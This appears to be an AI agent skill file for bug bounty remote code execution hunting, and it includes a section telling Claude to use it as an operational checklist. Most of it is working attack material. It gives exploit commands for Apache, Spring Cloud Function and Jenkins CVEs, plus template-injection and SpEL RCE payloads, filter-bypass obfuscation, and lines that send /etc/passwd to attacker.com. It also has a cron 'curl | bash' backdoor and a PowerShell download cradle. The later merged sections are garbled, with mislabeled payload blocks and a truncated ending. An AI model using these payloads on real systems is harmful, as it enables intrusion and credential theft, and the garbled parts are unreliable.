---
name: hunt-rce
description: Remote Code Execution testing: command injection, deserialization to RCE, blind RCE, OOB techniques. Real-world bounty chains.
---

## Crown Jewel Targets

RCE vulnerabilities command the highest payouts in bug bounty programs because they grant attackers direct execution control over target infrastructure. The highest-value targets are:

**Highest-paying asset types:**
- **Enterprise server products** (GitHub Enterprise Server, self-hosted GitLab) — privilege escalation chains from low-privileged console roles to root SSH access consistently pay critical/high
- **Supply chain / package registries** — dependency confusion attacks against npm, PyPI, etc. hit critical severity across every major program
- **Cloud-native infrastructure** — exposed Kubernetes API servers, ingress controllers, and misconfiqured CI/CD pipelines
- **Mobile app backends and OAuth flows** — where server-side processing of attacker-controlled data meets execution contexts
- **Admin/management consoles** — template injection in configuration panels reaches root with a single payload

**Why this class pays most:**
- Blast radius is infrastructure-wide, not user-scoped
- Proof-of-concept is unambiguous — shell output is undeniable
- Fix requires architectural changes, not just a patch
- Programs cannot afford false negatives on RCE

---

## Attack Surface Signals

### URL Patterns
```
/management-console/*
/admin/settings/*
/api/v*/exec
/api/v*/run
/webhook/*
/_internal/*
/import?url=
/render?template=
/preview?format=
```

### Response Headers / Tech Stack Signals
```
X-Powered-By: Express          # Node.js — npm dependency surface
X-Powered-By: Phusion Passenger
Server: nginx (ingress-nginx)  # Kubernetes ingress — path field injection
X-Runtime: Ruby                # Rails ActiveStorage, RDoc, REXML attack surface
Content-Type: application/yaml # YAML parsers (SnakeYAML, Psych) — deserialization
X-GitHub-Enterprise-Version    # GHAS — nomad template, collectd, syslog-ng injection
```

### JavaScript / Frontend Signals
```javascript
// Look for these patterns in JS bundles
fetch('/api/exec', {method:'POST', body: cmd})
eval(userInput)
new Function(userInput)
document.write(unsafeData)
window.location = userControlled  // URL scheme bypass → JS execution
```

### Tech Stack Signals
| Signal | RCE Vector |
|--------|-----------|
| `nomad` in config UI | Template injection → `{{ ... }}` |
| `syslog-ng` config editable | Config injection → `program()` destination |
| `collectd` config editable | Plugin exec injection |
| `SnakeYAML` in classpath | `!!javax.script.ScriptEngineManager [...]` |
| npm `package.json` internal scope | Dependency confusion |
| ingress-nginx annotations | Path field regex bypass |

---

## Step-by-Step Hunting Methodology

1. **Map the execution contexts first.** Before testing payloads, identify everywhere user-controlled input touches an execution layer: template engines, shell commands, YAML parsers, file paths used in operations, package resolution, and configuration files.

2. **Enumerate admin/management interfaces.** Crawl for `/management-console`, `/admin`, `/_internal`, `/setup`, `/config`. These surfaces are lower-auth and higher-privilege — the GHES cluster produced 6 separate RCEs from one console role.

3. **Check template injection in every config field.** In any management UI that accepts free-form configuration (log destinations, notification formats, proxy settings), submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. Look for `49` in responses, logs, or DNS callbacks.

4. **Test YAML/XML/serialized input for code execution.** Any endpoint accepting `Content-Type: application/yaml` or `application/xml`:
   - SnakeYAML: submit `!!javax.script.ScriptEngineManager` gadget
   - Ruby YAML: submit `!ruby/object:Gem::Installer` gadget
   - REXML: submit billion-laughs / quadratic blowup XML

5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos — register a higher-versioned package on the public registry pointing to a canary callback.

6. **Check file path operations for traversal → execution.** ActiveStorage, file upload handlers, symlink operations: submit `../../../etc/cron.d/shell` as filename. Confirm write then trigger execution.

7. **Audit Kubernetes/cloud-native surfaces.** Run `kubectl` against any exposed API server. Check ingress annotations, especially `nginx.ingress.kubernetes.io/configuration-snippet` and `spec.rules.http.paths.path` for Lua/regex injection.

8. **Test OAuth redirect URI and URL scheme handlers.** Mobile apps processing `javascript:` or `intent://` URIs via OAuth redirect may execute JavaScript. Try `javascript:alert(document.cookie)` and custom scheme URIs.

9. **Verify with out-of-band callbacks.** Never rely solely on visible output. Use Burp Collaborator, interactsh, or `canarytokens.org` DNS tokens. Blind RCE is common in backend processors.

10. **Chain privileges.** A low-severity misconfiguration (editor role, CSRF, path traversal) combined with an RCE primitive equals critical. Always ask: "what can I reach from here?"

---

## Payload & Detection Patterns

### Template Injection Probes
```
# Generic polyglot — works across Jinja2, Twig, Freemarker, Pebble, Velocity
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
{{'7'*7}}
{{config}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# Nomad template injection (Go text/template)
{{ env "NOMAD_SECRET_ID" }}
{{ with secret "secret/data/prod" }}{{ .Data.password }}{{ end }}
{{ runscript "id" }}
```

### Apache HTTP Server alias path traversal (CVE-2021-41773 / CVE-2021-42013)

Path normalization bug in Apache 2.4.49 (and the 2.4.50 patch-bypass) lets an attacker escape DocumentRoot via dot-encoded segments **through configured alias paths**. The same primitive yields very different impact depending on which alias accepts the traversal:

- Alias without `Options +ExecCGI` (e.g. `/icons/`) → arbitrary file read only
- Alias with `Options +ExecCGI` (e.g. `/cgi-bin/`) → arbitrary code execution

**Version fingerprint:**
```bash
curl -sI http://target/ | grep -i "Server:"
# Vulnerable: Apache/2.4.49 (CVE-2021-41773) or Apache/2.4.50 (CVE-2021-42013)
# Patched:    Apache/2.4.51+
```

**File-read test (any alias):**
```bash
curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# Note: --path-as-is is REQUIRED — curl normalizes %2e by default
```

**RCE test (cgi-enabled alias only):**
```bash
curl --path-as-is -X POST \
  -d "echo Content-Type: text/plain; echo; id; uname -a; hostname" \
  "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

**Triage discipline note:** when the same path-traversal primitive works on multiple aliases but only one is CGI-enabled, the **maximum** impact is the severity — not the average. A "file read" finding on `/icons/` should always be escalated by re-probing `/cgi-bin/` (and any other alias visible from `<Directory>` blocks in the server-info disclosure or response patterns). See `triage-validation` Pre-Severity Gate.

### Spring Cloud Function SpEL injection (CVE-2022-22963)

Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6) evaluates the `spring.cloud.function.routing-expression` header as a SpEL expression on the `/functionRouter` endpoint without auth, before any routing logic. Wide deployment in AWS Lambda + Cloud Run + on-prem function platforms. Often exposed externally because `/functionRouter` auto-registers and devs don't add an explicit gate.

**Detection:**
- Spring-style port 8080 with `/uppercase`, `/lowercase`, or arbitrary single-word function endpoints responding 200
- Confirm with `curl -s http://target:8080/uppercase -H "Content-Type: text/plain" --data-binary "test"` → returns `TEST`
- Version banner via `/actuator/info` or response headers

**Exploit:**
```bash
curl -X POST http://target:8080/functionRouter \
  -H "Content-Type: text/plain" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \
  --data "x"
```

The `new String[]{"...", "..."}` array form avoids shell-quoting issues that break the more common `.exec("id")` form when the SpEL header contains parentheses or quotes.

**Generalizes to:** any Spring application that takes user input into a `SpelExpressionParser.parseExpression()` call, especially when delivered via header / query-param routes that bypass normal auth filters. See `hunt-ssti` for the broader SpEL fingerprinting (`*{7*7}` = Spring Thymeleaf).

### SnakeYAML RCE Gadget
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

### Ruby YAML / rdoc_options RCE
```yaml
--- !ruby/object:Gem::Installer
i: x
```

### Dependency Confusion Detection
```bash
# Find internal package names
grep -r '"name"' node_modules/ | grep '@internal\|@company\|@private'
# Check if public registry has higher version
npm view @target-company/internal-package version 2>/dev/null
```

### Ingress-nginx Path Injection
```
# In spec.rules.http.paths.path
/something)(;.*);#
# Results in nginx config injection
```

### Kubernetes Exposed API Check
```bash
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespaces
```

### Out-of-Band RCE Confirmation
```bash
# Payload to confirm blind RCE via DNS
curl "http://$(id | base64).YOUR-INTERACTSH-URL/"
nslookup $(whoami).attacker.com
wget http://attacker.com/$(cat /etc/hostname)
```

### ActiveStorage Path Traversal → RCE
```
# Filename in upload request
filename="../../../../etc/cron.d/backdoor"
# Cron payload content
* * * * * root curl http://attacker.com/shell | bash
```

### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)

Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back — turning argument echoing into an arbitrary file-read primitive. Unauthenticated when "anonymous read access" is on (Jenkins default for fresh installs).

**Detection:**
- Target exposes `/cli` and `/jnlpJars/jenkins-cli.jar` (Jenkins family)
- Or: any Java app whose CLI source uses args4j without `expandAtFiles=false`

**Test (Jenkins):**
```bash
# Get the legit CLI jar from the target
curl -sLO http://target:8080/jnlpJars/jenkins-cli.jar

# First line of file leaks via 'help' error
java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/etc/passwd
# → ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash

# Full file leaks via 'connect-node' (every line returned as a "no such agent" error)
java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node @/etc/passwd
# → All passwd lines echoed back

# Recon: env vars + JENKINS_HOME path
java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/proc/self/environ
```

**Crown-jewel files after JENKINS_HOME confirmed:**
- `/var/jenkins_home/secret.key` — master encryption key for stored credentials
- `/var/jenkins_home/secrets/master.key` — derives the encryption key
- `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypt tools)
- `/var/jenkins_home/users/*/config.xml` — per-user API tokens (often unencrypted)
- `/var/jenkins_home/jobs/*/config.xml` — pipeline configs that may inline AWS keys, SSH keys, registry tokens

**Pattern generalizes beyond Jenkins.** Any Java service that:
1. Embeds args4j (most enterprise Java CLIs since 2010s)
2. Exposes the CLI handler over HTTP (Jenkins, Hudson forks, custom internal tools)
3. Returns argument-parsing errors verbatim to the client

→ same arbitrary-read primitive applies. Validation via `triage-validation` Reproducibility Gate: confirm the leak on at least 2 distinct commands (e.g., `help` and `connect-node`) and verify the file content actually appears in the response, not just a generic 500.

### Grep Patterns for Source Review
```bash
# Command injection sinks
grep -rn "exec\|system\|popen\|spawn\|eval\|subprocess" --include="*.rb" .
grep -rn "Runtime.exec\|ProcessBuilder\|ScriptEngine" --include="*.java" .

# Template engine instantiation
grep -rn "Mustache\|Handlebars\|nunjucks\|render_template\|Template\(" .

# Unsafe YAML load
grep -rn "yaml\.load\b\|YAML\.load\b" . # without Loader= argument
grep -rn "Yaml()\|new Yaml()" --include="*.java" .
```

---

## Common Root Causes

**1. Configuration-as-code with insufficient sanitization**
Administrators edit configuration files (syslog-ng, collectd, nomad) through web UIs. Developers assume admin == trusted, so they pass field values directly into config files that support execution primitives (`program()` destinations, exec plugins, template functions).

**2. Template engines in privileged contexts**
Go's `text/template`, Freemarker, Velocity, and Twig are used for system configuration rendering. When user-controlled strings reach these engines without sandboxing, arbitrary code follows.

**3. Dependency confusion / namespace squatting**
Internal packages published to private registries without locking the public registry namespace. Build systems that prefer public registries by default, or that fall through to public when the private registry lacks a package.

**4. Unsafe deserialization of YAML/XML**
Developers use `YAML.load()` without safe loaders, or `new Yaml()` (SnakeYAML) without type restrictions. Ruby's `YAML.load` and Java's SnakeYAML both support arbitrary object instantiation by default.

**5. Path traversal in file operation chains**
Filenames accepted from user input are used in filesystem operations without normalization. Rails ActiveStorage, file upload handlers, and rdoc generators trust the `filename` parameter.

**6. Assuming low-privilege roles can't reach execution contexts**
The GHES management console granted "Editor" roles access to configuration fields that touched shell execution. Developers assumed privilege boundaries existed at a higher architectural level.

**7. Missing input validation on infrastructure-facing fields**
Ingress/nginx annotation values, Kubernetes spec fields, and webhook URLs are treated as opaque strings — but the downstream processor (nginx config generator, regex engine) interprets them as code.

---

## Bypass Techniques

### Bypass: Shell metacharacter filtering
```bash
# Blocked: ; | & ` $()
# Bypass using $IFS and encodings
cat${IFS}/etc/passwd
{cat,/etc/passwd}
$'\x63\x61\x74' /etc/passwd  # hex encoding
$(printf '\x63\x61\x74') /etc/passwd

# Newline injection when semicolons blocked
payload=$'\ncurl attacker.com\n'
```

### Bypass: URL scheme allowlist (javascript: blocked)
```
# Mobile apps often block javascript: but miss:
jAvAsCrIpT:alert(1)          # case variation
javascript&#58;alert(1)      # HTML entity
javascript:void(alert(1))    # void wrapper
intent://attacker.com#Intent;scheme=javascript;...
data:text/html,<script>alert(1)</script>
```

### Bypass: YAML safe_load / type restrictions
```yaml
# If !!java.* is blocked, try legitimate classes with side effects
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: 'ldap://attacker.com/a'
  autoCommit: true
# Or find allowlisted types with dangerous constructors
```

### Bypass: npm scope restrictions
```
# If @company/* is monitored, look for unscoped internal names
# e.g., "internal-utils" instead of "@company/internal-utils"
# Public registries serve unscoped packages first
```

### Bypass: Path traversal filters
```
# Basic filter bypass
../           → ..%2F → %2e%2e%2f → ....// 
# Double encoding
%252e%252e%252f
# Unicode normalization
..%c0%af  (overlong UTF-8)
# Null byte (older systems)
../../etc/passwd%00.jpg
```

### Bypass: Template injection with output filtering
```
# If {{ }} is sanitized on output but not evaluation:
{% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}
# Blind — use DNS callback instead of output
{{ lipsum.__globals__.os.popen('nslookup $(id).attacker.com').read() }}
```

### Bypass: WAF blocking `exec`, `system`, `popen`
```ruby
# Ruby
send(:system, "id")
method(:exec).call("id")
Kernel.send(:`, "id")
Object.const_get(:Kernel).system("id")
```

---

## Gate 0 Validation

Before writing the report, confirm all three:

**1. What can the attacker DO right now?**
You must be able to demonstrate one of: execute `id`/`whoami` and capture the output, make a DNS/HTTP callback from the target server to your controlled host, write a file to the filesystem, or read `/etc/passwd`. "Might be able to" fails this gate.

**2. What does the victim LOSE?**
Articulate the concrete impact: source code exfiltration, credential theft (database, API keys, cloud IAM), lateral movement to internal network, supply chain compromise of downstream users, data destruction. Generic "attacker gains RCE" fails — name the crown jewels at risk.

**3. Can it be reproduced in 10 minutes from scratch?**
Write the reproduction steps before submitting. If you need more than: (a) a Burp request, (b) a payload file, and (c) a listener — simplify it. If reproduction requires a specific race condition, timing, or ephemeral state, document the exact conditions. Triagers who can't reproduce in one attempt will downgrade or close the report.

---

## Real Impact Examples

**Scenario A: Management Console Role → Root Shell (Enterprise Server)**
An attacker with a low-privileged "Management Console Editor" account on a GitHub Enterprise Server instance identified that the syslog-ng configuration UI accepted a free-form "destination" field. By injecting a `program()` destination containing a reverse shell command, the attacker caused the syslog-ng daemon (running as root) to execute arbitrary OS commands upon log receipt. The same attack surface was independently found in collectd's exec plugin configuration and nomad's job template rendering — all reachable from the same editor role. Impact: full root compromise of the enterprise git server hosting all organization source code, secrets, and CI/CD pipelines.

**Scenario B: Dependency Confusion → RCE on Build Infrastructure**
A researcher enumerated internal npm package names by reviewing JavaScript bundles served from target CDN endpoints and public GitHub repositories belonging to a major payments platform. Several `@internal/*` scoped packages were referenced but not registered on the public npm registry. The researcher published higher-versioned packages with identical names containing a postinstall script that executed a canary callback. Within hours, the callback fired from multiple IP addresses belonging to the target's CI/CD build farm — confirming that every npm install on their build infrastructure executed attacker-controlled code. The same technique worked against a ride-sharing platform's internal tooling. Impact: arbitrary code execution on build servers with access to production deployment credentials and signing keys.

**Scenario C: Exposed Kubernetes API → Cluster Takeover**
During reconnaissance on a target's cloud infrastructure, a researcher discovered a publicly accessible Kubernetes API server (port 6443) with overly permissive RBAC. Using default service account tokens and unauthenticated API calls, the researcher enumerated running pods, retrieved secrets from the default namespace (including database credentials and third-party API keys), and demonstrated the ability to spawn privileged pods with `hostPID: true` — enabling full node compromise. The Kubernetes cluster managed the target's core production services. Impact: access to all stored secrets, ability to deploy malicious workloads, and pivot to every service in the cluster.

---

## Chains & Compositions (Senior Hunting)

RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed of (1) a primitive that puts attacker bytes onto the host or into a deserialization pipeline, plus (2) an exec gadget that interprets them. The chains below decompose six high-paying RCE shapes into their primitive components — each step is testable in isolation, the chain is what pays.

### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)

- **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
- **B.** Point SSRF at AWS IMDSv1 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
- **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
- **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
- **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `hunt-ssrf` Disclosed Report Citation #6.

### Chain 2 — SQLi + `COPY FROM PROGRAM` → Direct OS-level RCE on Postgres Host

- **A.** SQLi confirmed on a Postgres backend (boolean/time-based works; UNION not needed).
- **B.** The DB user has either `pg_read_server_files` or `COPY` privileges (default for many AWS RDS / Google Cloud SQL roles when "admin" databases exist).
- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user.
- **Impact:** RCE as the database user, which on managed Postgres frequently has IAM credentials and direct access to other AWS resources.
- **Real shape:** Multiple H1 disclosures 2020-2024 across SaaS apps backed by Postgres. Cross-refs `hunt-sqli` Disclosed Report Citation #12 and root cause discussion of `FILE`/`xp_cmdshell` privileges.

### Chain 3 — Image Upload + Path Traversal in Filename + Misconfigured MIME Serving → Webshell

- **A.** File upload accepts images (`image/png`, `image/jpeg`). The server saves with the user-supplied filename or only validates Content-Type, not actual content.
- **B.** Upload a `.aspx`/`.jsp`/`.php` file with the correct image magic-bytes (`GIF89a` + PHP after) and a filename containing `../` to write outside the upload directory into the web-root (`../../../public/webshell.php`).
- **C.** Request `https://target/webshell.php?cmd=id` — server's PHP/ASP.NET handler runs the script regardless of extension policy because the path doesn't pass through the upload-dir filter.
- **Impact:** Unauthenticated or low-priv attacker gets webshell on the application server with the web-server's process privileges.
- **Real shape:** Multiple disclosed H1 cases on legacy upload handlers; canonical pre-2020 RCE class. Pairs with `hunt-file-upload` (upload bypass table) and `hunt-misc` path-traversal patterns.

### Chain 4 — Prototype Pollution + Lodash/Mongoose Gadget Chain → `child_process.spawn` → Node RCE

- **A.** Identify prototype pollution sink — JSON merge / Object.assign / lodash `_.merge` / Node `Object.create` chain receiving attacker JSON.
- **B.** Pollute `Object.prototype.shell` to `true` OR `Object.prototype.env.NODE_OPTIONS` to `--require ./malicious.js`. The polluted prototype reaches a downstream `child_process.spawn` or `vm.runInThisContext`.
- **C.** Sink executes with attacker-controlled shell/env → attacker code runs in Node.js process context with full access to environment variables, AWS metadata, internal services.
- **Impact:** Server-side JS execution from a JSON POST. Common in Express apps using `body-parser` + `lodash.merge` for config-merging.
- **Real shape:** `lodash.merge` CVE-2018-16487, CVE-2019-10744, CVE-2020-8203; `mongoose` CVE-2024-53900 (cross-refs `hunt-sqli` Disclosed Report Citation #10 — same gadget family reaches Mongo `$where` instead of process).

### Chain 5 — Unencrypted ViewState + Recovered MachineKey → ASP.NET Deserialization → RCE (ToolShell class)

- **A.** Identify an ASP.NET endpoint where `__VIEWSTATEENCRYPTED=""` (ViewState is signed but not encrypted). Confirm via Burp / curl on form-bearing pages.
- **B.** Recover the `<machineKey>` validationKey — via config leak (`/web.config` accessible), via subdomain takeover of a sibling app sharing the key, or via the CVE-2025-53771 ToolShell exploit chain that exfils the key on Subscription Edition.
- **C.** Forge a ViewState using `ysoserial.net --plugin=ViewState --validationkey=<key>` with a `TypeConfuseDelegate` / `WindowsIdentity` payload. Submit to the endpoint. ASP.NET deserialises into a method-call gadget chain ending in `Process.Start` → RCE as the worker-process identity.
- **Impact:** Full RCE on the IIS web front-end with whatever the AppPool identity grants — often `NETWORK SERVICE` (with SharePoint farm-account access) or higher.
- **Real shape:** CVE-2025-53770 / 53771 ToolShell (July 2025 emergency advisory); SP2013 unpatched-by-EoL exposure. Cross-refs `hunt-sharepoint` ToolShell precondition chain and `hunt-aspnet` ViewState dual-parser anti-pattern.

### Chain 6 — XXE + PHP `expect://` Stream Wrapper → Direct RCE on Legacy PHP

- **A.** XXE confirmed via OOB DTD callback (`<!ENTITY % x SYSTEM "http://attacker/dtd">`).
- **B.** Target runs PHP with the `expect` extension enabled (rare in 2026, but still present on legacy hosts and some shared-hosting providers).
- **C.** Send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>` — PHP's stream wrapper executes `id` through expect → output returned in entity expansion or via OOB.
- **Impact:** RCE as the PHP/web-server user without needing a separate upload or SQLi primitive.
- **Real shape:** Rockstar Games emblem editor XXE H1 #347139 (2018, $1,500); Adobe Commerce CosmicSting CVE-2024-34102 (XXE → RCE via crypt-key exfil). Cross-refs `hunt-xxe` Disclosed Report Citation #7 and #10.

### Operator-level pattern

Every modern RCE chain has two halves: **the bytes get there** (SSRF, SQLi, upload, prototype-pollution, ViewState, XXE) and **the bytes get interpreted** (lambda invoke, COPY PROGRAM, webshell handler, child_process.spawn, deserializer gadget, expect://). Hunt for the first half; the second is usually one of the six above. If your first-half primitive doesn't compose with any of these — pause before submitting. "Could lead to RCE" is Low/Medium; "RCE demonstrated end-to-end" is Critical.

Cross-references:
- `hunt-ssrf` — Chain 1
- `hunt-sqli` — Chain 2
- `hunt-file-upload` — Chain 3
- `hunt-api-misconfig` (proto-pollution) — Chain 4
- `hunt-sharepoint` + `hunt-aspnet` — Chain 5
- `hunt-xxe` — Chain 6

---

## Related Skills & Chains

- **`hunt-ssti`** — Template engines that hit `eval()`/`exec()`/`os.system()` are RCE hiding behind a render call. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` reflected in email-template preview → unauthenticated RCE as the worker process.
- **`hunt-file-upload`** — File-write primitives become RCE when the upload directory is web-served, processed by a deserializer, or loaded by a `.htaccess`/`web.config`. Chain primitive: SVG/PHP polyglot bypasses MIME check → direct `GET /uploads/shell.php?cmd=id` → RCE; or DOCX with `phar://` stream wrapper → PHP object deserialization → RCE.
- **`hunt-ssrf`** — When the RCE primitive lives on an internal-only endpoint (admin console, internal Redis, Jenkins script-console), gate it through an SSRF. Chain primitive: external SSRF → `http://127.0.0.1:8080/manage/scriptText` (Jenkins/Tomcat) → Groovy `Runtime.exec` → RCE; or SSRF → `gopher://redis:6379` write to crontab → RCE.
- **`hunt-aspnet`** — ASP.NET ViewState deserialization is a giant RCE class behind a known `__VIEWSTATE` parameter. Chain primitive: machineKey recovery (or leaked `<machineKey>` from `web.config` disclosure) → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as `IIS APPPOOL\<name>`.
- **`security-arsenal`** — Reach for the deserialization payload tree (ysoserial Java gadget chains, ysoserial.net for .NET ViewState/BinaryFormatter, Python pickle `__reduce__`, Ruby Marshal, PHP `phar://` metadata, Node `node-serialize` IIFE) the moment you have a sink that accepts serialized bytes.
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A "blind RCE" that turns out to be file-write-only with no execution path is not RCE; a sandboxed eval that can't reach `os` is at best Medium SSTI. Prove `whoami`/OOB DNS callback with a unique marker before writing the report.

---

# Additional Techniques (merged from offensive-rce/SKILL.md)

## Description
Remote Code Execution testing checklist: OS command injection, SSTI-to-RCE, deserialization RCE, file upload RCE, XXE with SSRF to RCE, RCE via dependency confusion, and CVE-based RCE patterns. Use for web app pentests and bug bounty RCE discovery.

## Trigger Phrases
Use this skill when the conversation involves any of:
`RCE, remote code execution, command injection, OS injection, SSTI RCE, deserialization RCE, file upload RCE, XXE RCE, dependency confusion, code execution`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

# Remote Code Execution

occurs when an attacker can execute arbitrary code on a target machine because of a vulnerability or misconfiguration.

## Shortcut

1. Identify suspicious user input locations. for code injections, take note of every user input location, including URL parameters, HTTP headers, body parameters, and file uploads. to find potential file inclusion vulnerabilities, check for input locations being used to inclusion vulnerabilities, check for input locations being used to determine or, construct filenames and, for file upload functions.
2. Submit test payloads to the input locations in order to detect potential vulnerabilities.
3. If your requests are blocked, try protection bypass techniques and see if your payload succeeds.
4. Finally, confirm the vulnerability by trying to execute harmless commands such as `whoami`, `ls`, and, `sleep 5`.

### Code Injection

This program takes a user input string, pass it through `eval()` and return the results:

```python
def calculate(input):
  return eval("{}".format(input))

result = calculate(user_input.calc)
print("The result is {}.".format(result))
```

an attacker could provide the application with something more malicious instead:

```http
GET /calculator?calc="__import__('os').system('ls')"
Host: example.com
```

### File Inclusion

making the target server include a file containing malicious code.

```php
<?php
  // Some PHP code

  $file = $_GET["page"];
  include $file;

  // Some PHP code
?>
```

if the application doesn't limit which file the user includes with the page parameter, an attacker can include a malicious PHP file.

```php
<?PHP
  system($_GET["cmd"]);
?>
```

and then they can run commands:

```http
http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
```

### Server-Side Template Injection (SSTI)

User-controlled template strings evaluated by template engines (Jinja2, Twig, Freemarker, Thymeleaf) can lead to RCE.

Probe with arithmetic/concat markers, escalate using engine-specific object graphs. Tools: `tplmap`.

### Insecure Deserialization

Deserializing untrusted data (Java, .NET, PHP, Python `pickle`) can trigger gadget chains to RCE.

Test with known gadget payloads (e.g., `ysoserial`, `marshalsec`), and observe blind effects via OAST.

### Unsafe YAML and Config Parsers

Loading YAML with object constructors (`yaml.load` vs `safe_load`) can lead to code execution.

### File Upload → Processing Chains

Upload parsers (ImageMagick, ExifTool, video transcoders) may execute/parse complex formats leading to RCE. Test with harmless PoCs and OAST.

### 1. Identify Input Vectors

Map all user-controlled input that could lead to code execution:

- **Command-line argument injection**: APIs that execute shell commands, CLI tools, system utilities
- **Template engines**: User-provided templates or template variables (Jinja2, Twig, Freemarker, Thymeleaf, ERB, Handlebars)
- **File uploads**: Server-side processing of images, documents, archives, media files
- **Deserialization endpoints**: APIs accepting serialized objects (Java, .NET, Python pickle, PHP serialize, Ruby Marshal)
- **Expression Language fields**: Search filters, calculations, dynamic queries (SpEL, OGNL, MVEL, EL)
- **Webhook URLs**: Server-side fetches triggered by user-supplied URLs
- **Log file paths**: Log injection leading to log processing (LogForge, Log4Shell)
- **Configuration files**: Upload or modification of config files (.htaccess, web.config, cron jobs)
- **Email/document processing**: Mail parsers, PDF generators, office document converters
- **Image manipulation**: ImageMagick, GraphicsMagick, Pillow, GD library operations
- **Video/audio processing**: FFmpeg, ExifTool, media transcoders

# Out-of-band (OAST)
; nslookup $(whoami).attacker.com
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)

# Space bypasses
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Command obfuscation
c''at /etc/passwd
c\at /etc/passwd
c"a"t /etc/passwd
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# PowerShell execution
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

#### Server-Side Template Injection (SSTI) Payloads

**Jinja2 (Python - Flask, Ansible):**

```python

# Find useful classes
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}

# subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Modern bypass (Python 3)
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Cycler object
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
```

**Twig (PHP - Symfony):**

```twig

# Alternative
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign method=clazz.getMethod("getRuntime",null)>
<#assign runtime=method.invoke(null,null)>
<#assign method=clazz.getMethod("exec",classLoader.loadClass("java.lang.String"))>
${method.invoke(runtime,"whoami")}
```

**Thymeleaf (Java - Spring):**

```java

# Spring EL alternative
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
```

**ERB (Ruby - Rails):**

```ruby

# RCE (if helper is vulnerable)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Expression Language (EL) Injection

**Spring SpEL (Spring Framework):**

```java

# Alternative methods
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}

# Bypass blacklist
${T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"whoami"})}
```

**OGNL (Object-Graph Navigation Language - Struts):**

```java

# CVE-2017-5638 (Content-Type exploitation)
